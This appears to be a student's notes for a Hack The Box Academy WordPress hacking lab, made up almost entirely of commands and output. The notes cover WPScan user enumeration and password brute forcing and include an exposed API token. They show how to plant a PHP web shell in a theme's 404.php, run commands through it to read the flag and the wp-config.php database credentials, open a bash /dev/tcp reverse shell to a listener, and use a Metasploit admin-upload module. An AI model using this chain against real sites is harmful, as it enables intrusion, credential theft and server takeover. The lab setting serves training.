# Hacking WordPress with Hack The Box

- **HTB Course**: [Hacking WordPress - HTB Academy](https://academy.hackthebox.com/course/preview/hacking-wordpress)
- **Video Series**: [WordPress Hacking Playlist on YouTube](https://www.youtube.com/watch?v=b3Q9htmHB20&list=PLX7vPiTmryzE7JAKJUyIVltANMiEJZ5U2&index=3&pp=iAQB)
- **Watch "HackTheBox - MetaTwo"**: [HackTheBox - MetaTwo Walkthrough](https://youtu.be/Alx5KQWq7ZM?si=GsnzKNzVilcwlMUt)

---

## Directory Indexing with WPScan
### User Enumeration
```bash
wpscan --url http://94.237.59.180:59261 -e u
```

API Token Authentication:
```bash
wpscan --url http://94.237.59.180:59261 --api-token VyjB9rxyQz0cFqLA14dKJ8aLwbZeNEleBazHsRS1J8o
```

Brute Force Attack:
```bash
wpscan --url http://94.237.59.180:59261 --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

Example Output:
```bash
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - admin / sunshine1

_______________________________

Valid Combinations Found:
 | Username: roger, Password: lizard
_______________________________
```

### Exploiting Vulnerabilities in Themes

Injecting a Web Shell into a Theme:

1. Select a non-critical file, e.g., 404.php.
   
2. Replace file content with the following.

```bash
<?php
system($_GET['cmd']);
?>
```

3. Access the shell via:
```bash
http://94.237.59.180:59261/wp-content/themes/twentyseventeen/404.php?cmd=id
```

Validation of Remote Code Execution (RCE):
```bash
curl -X GET "http://94.237.59.180:59261/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

Check Files
```bash
curl -X GET "http://94.237.61.84:42206/wp-content/themes/twentyseventeen/404.php?cmd=ls"
curl -X GET "http://94.237.61.84:42206/wp-content/themes/twentyseventeen/404.php?cmd=ls+/"
```

Retrieve Flag
```bash
curl -X GET "http://94.237.61.84:42206/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/wp-user/flag.txt"
```

Extract WordPress Configuration
```bash
curl -X GET "http://94.237.61.84:42206/wp-content/themes/twentyseventeen/404.php?cmd=cat+/usr/src/wordpress/wp-config.php"
```

Example Output:
```bash
/** MySQL database username */
define( 'DB_USER', 'wp-admin');

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpress');
```

### Reverse Shell

Listener Setup
```bash
nc -lvnp 1234
```

Execute Reverse Shell on Target Server
```bash
curl -X GET "http://94.237.61.84:42206/wp-content/themes/twentyseventeen/404.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/10.10.73.57/1234%200%3E%261"
```

Troubleshooting Metasploit

Search for exploits:
```bash
searchsploit wordpress 5.1.6
```

Use Metasploit module:
```bash
search wp_admin
use 0
set rhosts http://94.237.57.27:35641/
set username admin
set password sunshine1
set lhost 10.10.147.84
run
```

```bash
(Note: Metasploit payloads may fail in some cases. Explore alternate exploits or manual approaches.)
```
